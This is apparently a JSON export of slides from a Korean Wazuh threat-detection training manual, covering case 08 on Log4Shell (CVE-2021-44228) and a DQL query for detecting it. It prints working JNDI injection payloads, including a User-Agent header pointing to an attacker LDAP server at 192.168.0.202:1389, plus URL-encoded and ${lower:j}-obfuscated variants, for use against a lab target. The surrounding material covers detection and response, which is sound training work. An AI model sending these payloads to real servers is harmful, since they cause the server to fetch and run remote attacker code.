@@ -1,0 +1,448 @@
+{
+  "id": "case-08",
+  "title": "08 · Log4Shell",
+  "source_pages": [
+    127,
+    137
+  ],
+  "slides": [
+    {
+      "page": 127,
+      "title": "개념 — 08 Log4Shell",
+      "blocks": [
+        {
+          "type": "text",
+          "text": "개념 — 08 Log4Shell"
+        },
+        {
+          "type": "text",
+          "text": "Log4Shell (CVE-2021-44228) — '로그를 쓰다가' 해킹당하다 (1/3)"
+        },
+        {
+          "type": "text",
+          "text": "Wazuh 위협 탐지 DQL 예시집  ·  개념 — 08 Log4Shell"
+        },
+        {
+          "type": "text",
+          "text": "1. 무엇인가"
+        },
+        {
+          "type": "text",
+          "text": "•"
+        },
+        {
+          "type": "text",
+          "text": "2021년 12월 공개, Java 프로그램이 널리 쓰는 로그 라이브러리 Log4j 2 의 원격 코드 실행 취약점 (CVSS 10.0 — 최고 위험)"
+        },
+        {
+          "type": "text",
+          "text": "•"
+        },
+        {
+          "type": "text",
+          "text": "수많은 기업 서버·게임(마인크래프트)·클라우드 서비스가 영향을 받았다"
+        },
+        {
+          "type": "text",
+          "text": "2. 원리 — 문자열 치환 기능의 함정"
+        },
+        {
+          "type": "text",
+          "text": "•"
+        },
+        {
+          "type": "text",
+          "text": "Log4j 는 로그 메시지 안의 ${…} 를 '값으로 바꿔 주는' 기능이 있었다 (예: ${java:version})"
+        },
+        {
+          "type": "text",
+          "text": "•"
+        },
+        {
+          "type": "text",
+          "text": "${jndi:ldap://공격자서버/a} 를 만나면 JNDI 로 공격자 LDAP 서버에 접속해 응답(자바 객체)을 불러와 실행해 버린다"
+        },
+        {
+          "type": "text",
+          "text": "•"
+        },
+        {
+          "type": "text",
+          "text": "서버가 User-Agent·검색어처럼 '사용자가 보낸 값을 로그에 남기기만 해도' 공격이 성립"
+        }
+      ]
+    },
+    {
+      "page": 128,
+      "title": "개념 — 08 Log4Shell",
+      "blocks": [
+        {
+          "type": "text",
+          "text": "개념 — 08 Log4Shell"
+        },
+        {
+          "type": "text",
+          "text": "Log4Shell (CVE-2021-44228) — '로그를 쓰다가' 해킹당하다 (2/3)"
+        },
+        {
+          "type": "text",
+          "text": "Wazuh 위협 탐지 DQL 예시집  ·  개념 — 08 Log4Shell"
+        },
+        {
+          "type": "text",
+          "text": "3. 공격 흐름"
+        },
+        {
+          "type": "text",
+          "text": "•"
+        },
+        {
+          "type": "text",
+          "text": "① 공격자가 헤더·파라미터에 ${jndi:ldap://공격자:1389/a} 전송 → ② 서버가 로그에 기록 → ③ Log4j 가 공격자 LDAP 에 접속 → ④ 악성 클래스 다운로드·실행 → ⑤ 서버 장악"
+        },
+        {
+          "type": "text",
+          "text": "4. 탐지·대응"
+        },
+        {
+          "type": "text",
+          "text": "•"
+        },
+        {
+          "type": "text",
+          "text": "탐지: 요청 어디든 jndi·${ (인코딩 %24%7B, 난독화 ${lower:j}) — Wazuh 4.10 기본 룰셋에는 전용 룰이 없어 DQL 로 찾는다"
+        },
+        {
+          "type": "text",
+          "text": "•"
+        },
+        {
+          "type": "text",
+          "text": "대응: Log4j 2.17 이상으로 업데이트, 서버의 바깥(아웃바운드) LDAP·RMI 연결 차단 — 콜백 IP 로 나간 연결이 있었는지 방화벽 로그 확인"
+        }
+      ]
+    },
+    {
+      "page": 129,
+      "title": "개념 — 08 Log4Shell",
+      "blocks": [
+        {
+          "type": "text",
+          "text": "개념 — 08 Log4Shell"
+        },
+        {
+          "type": "text",
+          "text": "Log4Shell (CVE-2021-44228) — '로그를 쓰다가' 해킹당하다 (3/3)"
+        },
+        {
+          "type": "text",
+          "text": "Wazuh 위협 탐지 DQL 예시집  ·  개념 — 08 Log4Shell"
+        },
+        {
+          "type": "text",
+          "text": "08번 공격 문자열 해부"
+        },
+        {
+          "type": "text",
+          "text": "${jndi:ldap://192.168.0.202:1389/a}\n │  │    │     └ 공격자 서버:포트/불러올 객체 이름\n │  │    └ 사용할 디렉터리 프로토콜 (ldap, rmi, dns …)\n │  └ JNDI = 자바의 '이름으로 원격 자원 찾기' 기능\n └ ${ } = Log4j 가 값을 바꿔 넣는 표시   ·   난독화: ${${lower:j}ndi:…} → lower:j 가 'j' 로 바뀐다"
+        }
+      ]
+    },
+    {
+      "page": 130,
+      "title": "웹 위협 · 08 / 61",
+      "blocks": [
+        {
+          "type": "text",
+          "text": "웹 위협 · 08 / 61"
+        },
+        {
+          "type": "text",
+          "text": "08 Log4Shell"
+        },
+        {
+          "type": "text",
+          "text": "Wazuh 위협 탐지 DQL 예시집  ·  웹 위협 · 08"
+        },
+        {
+          "type": "text",
+          "text": "공격"
+        },
+        {
+          "type": "text",
+          "text": "${jndi:ldap://공격자/x} 문자열을 헤더나 파라미터에 넣어 원격 코드 실행"
+        },
+        {
+          "type": "text",
+          "text": "탐지 포인트"
+        },
+        {
+          "type": "text",
+          "text": "요청 어디든 jndi 문자열. URL 인코딩(%24%7Bjndi)과 난독화(${${lower:j}ndi) 변형 존재"
+        },
+        {
+          "type": "text",
+          "text": "검색 원리"
+        },
+        {
+          "type": "text",
+          "text": "full_log 와일드카드는 인코딩된 토큰 안의 jndi도 잡음"
+        },
+        {
+          "type": "text",
+          "text": "주요 필드"
+        },
+        {
+          "type": "text",
+          "text": "full_log · data.url"
+        },
+        {
+          "type": "text",
+          "text": "결과 해석"
+        },
+        {
+          "type": "text",
+          "text": "대부분 스캔이지만 ldap://, rmi:// 뒤의 IP가 공격자 콜백 서버. 그 IP로 아웃바운드가 있었는지 방화벽 로그 교차 확인"
+        },
+        {
+          "type": "text",
+          "text": "원본 교재 검증 기록 · 원본 DQL 을 고쳐서 동작"
+        }
+      ]
+    },
+    {
+      "page": 131,
+      "title": "08 실습 ① 공격 실행 — Log4Shell",
+      "blocks": [
+        {
+          "type": "text",
+          "text": "08 실습 ① 공격 실행 — Log4Shell"
+        },
+        {
+          "type": "text",
+          "text": "Wazuh 위협 탐지 DQL 예시집  ·  웹 위협 · 08"
+        },
+        {
+          "type": "image",
+          "asset": "4b7b26bc114c1052c7e22938646715a3719b93b27db7eb4bc5b919c9d000b30b.png",
+          "alt": "교재 131페이지 예시 화면"
+        },
+        {
+          "type": "text",
+          "text": "공격자 VM 에서 학생이 직접 입력하는 명령과 실제 결과. # 줄은 설명, 노란색은 확인할 결과"
+        }
+      ]
+    },
+    {
+      "page": 132,
+      "title": "08 구문 풀이 — Log4Shell",
+      "blocks": [
+        {
+          "type": "text",
+          "text": "08 구문 풀이 — Log4Shell"
+        },
+        {
+          "type": "text",
+          "text": "Wazuh 위협 탐지 DQL 예시집  ·  웹 위협 · 08"
+        },
+        {
+          "type": "text",
+          "text": "-H 'User-Agent: ${jndi:ldap://192.168.0.202:1389/a}'"
+        },
+        {
+          "type": "text",
+          "text": "•"
+        },
+        {
+          "type": "text",
+          "text": "Log4j 가 로그에 이 문자열을 쓰는 순간 ${…} 를 '해석'하며 공격자 LDAP 서버(1389)에 접속 → 원격 코드 실행"
+        },
+        {
+          "type": "text",
+          "text": "q=%24%7Bjndi%3Aldap…%7D"
+        },
+        {
+          "type": "text",
+          "text": "•"
+        },
+        {
+          "type": "text",
+          "text": "같은 문자열을 URL 인코딩 (%24 = $, %7B = {, %3A = :, %2F = /)"
+        },
+        {
+          "type": "text",
+          "text": "${${lower:j}ndi:…}"
+        },
+        {
+          "type": "text",
+          "text": "•"
+        },
+        {
+          "type": "text",
+          "text": "난독화 — ${lower:j} 를 Log4j 가 'j' 로 바꿔 읽으므로 'jndi' 라는 글자 없이도 동작"
+        }
+      ]
+    },
+    {
+      "page": 133,
+      "title": "08 실습 ② 검색 준비 — Log4Shell",
+      "blocks": [
+        {
+          "type": "text",
+          "text": "08 실습 ② 검색 준비 — Log4Shell"
+        },
+        {
+          "type": "text",
+          "text": "Wazuh 위협 탐지 DQL 예시집  ·  웹 위협 · 08"
+        },
+        {
+          "type": "text",
+          "text": "인덱스 패턴"
+        },
+        {
+          "type": "text",
+          "text": "wazuh-alerts-*"
+        },
+        {
+          "type": "text",
+          "text": "시간 범위"
+        },
+        {
+          "type": "text",
+          "text": "Last 15 minutes (실습 직후)"
+        },
+        {
+          "type": "text",
+          "text": "DQL — 검색창에 직접 입력 → Enter"
+        },
+        {
+          "type": "text",
+          "text": "full_log:*jndi* OR data.url:(*jndi* or *%24%7B* or *$\\{*)"
+        },
+        {
+          "type": "text",
+          "text": "추가할 컬럼"
+        },
+        {
+          "type": "text",
+          "text": "agent.name  ·  rule.id  ·  rule.description  ·  data.srcip  ·  data.id  ·  full_log"
+        },
+        {
+          "type": "text",
+          "text": "xOC Range 결과"
+        },
+        {
+          "type": "text",
+          "text": "1 hits"
+        }
+      ]
+    },
+    {
+      "page": 134,
+      "title": "08 결과 화면 ① — 결과 수와 시간 분포",
+      "blocks": [
+        {
+          "type": "text",
+          "text": "08 결과 화면 ① — 결과 수와 시간 분포"
+        },
+        {
+          "type": "text",
+          "text": "Wazuh 위협 탐지 DQL 예시집  ·  웹 위협 · 08"
+        },
+        {
+          "type": "image",
+          "asset": "4d0349f3b03c2b2ec9838d1e93138dea864d17531153b99dc2c145249f36fc5e.png",
+          "alt": "교재 134페이지 예시 화면"
+        },
+        {
+          "type": "text",
+          "text": "1 hits"
+        },
+        {
+          "type": "text",
+          "text": "검색창 아래 hits = 찾은 건수, 막대 = 시간대별 건수. 실습 직후라 막대가 한곳에 몰려 있다"
+        }
+      ]
+    },
+    {
+      "page": 135,
+      "title": "08 결과 화면 ② — 결과 표",
+      "blocks": [
+        {
+          "type": "text",
+          "text": "08 결과 화면 ② — 결과 표"
+        },
+        {
+          "type": "text",
+          "text": "Wazuh 위협 탐지 DQL 예시집  ·  웹 위협 · 08"
+        },
+        {
+          "type": "image",
+          "asset": "5a102e75f1476bec7489fbb065a7759c9113ed5b83c45620027c1d85853b6d46.png",
+          "alt": "교재 135페이지 예시 화면"
+        },
+        {
+          "type": "text",
+          "text": "결과 표 — 위: 시간 · 에이전트 · 룰 / 아래: 같은 행의 나머지 열 (한 행 = 로그 한 건)"
+        }
+      ]
+    },
+    {
+      "page": 136,
+      "title": "08 결과 화면 ③ — 문서 펼치기 (Table)",
+      "blocks": [
+        {
+          "type": "text",
+          "text": "08 결과 화면 ③ — 문서 펼치기 (Table)"
+        },
+        {
+          "type": "text",
+          "text": "Wazuh 위협 탐지 DQL 예시집  ·  웹 위협 · 08"
+        },
+        {
+          "type": "image",
+          "asset": "bd9d595f227ead8e007941beb9bce4aaccc434be99905921fef8aa6c7595f834.png",
+          "alt": "교재 136페이지 예시 화면"
+        },
+        {
+          "type": "text",
+          "text": "행 왼쪽 > 를 눌러 펼친 화면. 노란색 = 검색 조건과 맞은 부분 · 긴 값은 오른쪽이 잘림 — 화면에서 직접 끝까지 확인"
+        }
+      ]
+    },
+    {
+      "page": 137,
+      "title": "08 결과 읽는 법 — Log4Shell",
+      "blocks": [
+        {
+          "type": "text",
+          "text": "08 결과 읽는 법 — Log4Shell"
+        },
+        {
+          "type": "text",
+          "text": "Wazuh 위협 탐지 DQL 예시집  ·  웹 위협 · 08"
+        },
+        {
+          "type": "text",
+          "text": "•"
+        },
+        {
+          "type": "text",
+          "text": "Wazuh 4.10 기본 룰셋에는 Log4Shell 전용 룰이 없다 → 403(차단)처럼 '400번대 오류' 룰에 걸린 줄만 alerts 에 남는다"
+        },
+        {
+          "type": "text",
+          "text": "•"
+        },
+        {
+          "type": "text",
+          "text": "full_log 에서 jndi·ldap 뒤의 IP:포트가 공격자 콜백 서버 → 방화벽에서 그 IP 로의 바깥 연결이 있었는지 확인"
+        },
+        {
+          "type": "text",
+          "text": "원본 자료와 달라진 점 — 원본 DQL 문법 오류: *${* 의 '{' → *$\\{*. 대상은 차단 모드인 dvwa (juice 는 200 이라 레벨 0 → 인덱스에 안 남음)"
+        }
+      ]
+    }
+  ]
+}
